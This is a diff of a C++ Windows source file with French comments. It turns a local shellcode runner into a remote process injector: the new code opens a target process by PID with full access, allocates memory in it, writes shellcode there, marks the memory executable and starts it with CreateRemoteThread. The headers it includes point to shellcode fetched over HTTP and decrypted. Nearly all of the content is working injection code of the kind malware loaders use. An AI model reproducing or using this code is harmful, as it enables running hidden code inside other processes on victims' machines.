@@ -1,57 +1,95 @@
-#include "Memory.h"
 #include <iostream>
+#include <stdio.h>
+#include <Windows.h>
+#include <tchar.h>
 
-bool injectShellcodeLocal(PBYTE shellcode, SIZE_T shellcodeSize) {
-    // Allouer de la mémoire pour le shellcode
-    LPVOID allocatedMemory = VirtualAlloc(
-        NULL,                           // Adresse préférée
-        shellcodeSize,                  // Taille de la mémoire
-        MEM_COMMIT | MEM_RESERVE,       // Type d'allocation
-        PAGE_READWRITE                  // Permissions initiales
+#include "Memory.h"  // Supposons que vous avez un fichier d'en-tête pour l'injection de shellcode
+#include "HTTPClient.h"    // Supposons que vous avez un fichier pour récupérer le shellcode via HTTP
+#include "Decrypt.h"  // Si vous avez besoin de déchiffrer le shellcode
+
+// Fonction pour injecter le shellcode dans le processus local
+bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
+    // Ouvrir le processus distant avec les droits nécessaires
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+    if (hProcess == NULL) {
+        std::cerr << "Erreur : Impossible d'ouvrir le processus cible !" << std::endl;
+        return false;
+    }
+    std::cout << "Processus cible ouvert avec succès." << std::endl;
+
+    // Allouer de la mémoire dans l'espace mémoire du processus distant
+    LPVOID remoteAddr = VirtualAllocEx(
+        hProcess,
+        NULL,
+        shellcodeSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
     );
-
-    if (!allocatedMemory) {
-        std::cerr << "Erreur : VirtualAlloc a échoué avec l'erreur : " << GetLastError() << std::endl;
+    if (remoteAddr == NULL) {
+        std::cerr << "Erreur : Échec de l'allocation mémoire dans le processus distant !" << std::endl;
+        CloseHandle(hProcess);
         return false;
     }
+    std::cout << "Mémoire allouée à distance à l'adresse : " << remoteAddr << std::endl;
 
-    std::cout << "Mémoire allouée à l'adresse : " << allocatedMemory << std::endl;
+    // Écrire le shellcode dans la mémoire allouée du processus distant
+    SIZE_T bytesWritten;
+    BOOL success = WriteProcessMemory(
+        hProcess,
+        remoteAddr,
+        shellcode,
+        shellcodeSize,
+        &bytesWritten
+    );
+    if (!success || bytesWritten != shellcodeSize) {
+        std::cerr << "Erreur : Échec de l'écriture du shellcode dans la mémoire distante !" << std::endl;
+        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+    else {
+        std::cout << "Shellcode écrit avec succès dans la mémoire distante." << std::endl;
 
-    // Copier le shellcode dans la mémoire allouée
-    memcpy(allocatedMemory, shellcode, shellcodeSize);
+    }
 
-    // Modifier les permissions pour exécuter le shellcode
+    // Modifier les permissions de la mémoire pour permettre l'exécution
     DWORD oldProtect;
-    if (!VirtualProtect(allocatedMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
-        std::cerr << "Erreur : VirtualProtect a échoué avec l'erreur : " << GetLastError() << std::endl;
-        VirtualFree(allocatedMemory, 0, MEM_RELEASE);
+    if (!VirtualProtectEx(hProcess, remoteAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
+        std::cerr << "Erreur : Échec de VirtualProtectEx pour rendre la mémoire exécutable !" << std::endl;
+        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
         return false;
     }
+    std::cout << "Permissions changées en PAGE_EXECUTE_READ." << std::endl;
+
 
     // Créer un thread pour exécuter le shellcode
-    HANDLE hThread = CreateThread(
-        NULL,                           // Sécurité par défaut
-        0,                              // Taille de la pile par défaut
-        (LPTHREAD_START_ROUTINE)allocatedMemory, // Adresse de démarrage
-        NULL,                           // Aucun paramètre
-        0,                              // Flags
-        NULL                            // ID du thread
-    );
 
-    if (!hThread) {
-        std::cerr << "Erreur : CreateThread a échoué avec l'erreur : " << GetLastError() << std::endl;
-        VirtualFree(allocatedMemory, 0, MEM_RELEASE);
+    // Créer un thread dans le processus distant pour exécuter le shellcode
+    HANDLE hThread = CreateRemoteThread(
+        hProcess,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)remoteAddr,
+        NULL,
+        0,
+        NULL
+    );
+    if (hThread == NULL) {
+        std::cerr << "Erreur : Échec de CreateRemoteThread dans le processus distant !" << std::endl;
+        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
         return false;
     }
-
-    std::cout << "Thread créé avec succès pour exécuter le shellcode." << std::endl;
+    std::cout << "Thread créé avec succès dans le processus distant." << std::endl;
 
     // Attendre la fin du thread
     WaitForSingleObject(hThread, INFINITE);
+    std::cout << "Le shellcode a été exécuté dans le processus distant." << std::endl;
 
     // Nettoyer les ressources
     CloseHandle(hThread);
-    VirtualFree(allocatedMemory, 0, MEM_RELEASE);
-
+    //VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
     return true;
 }
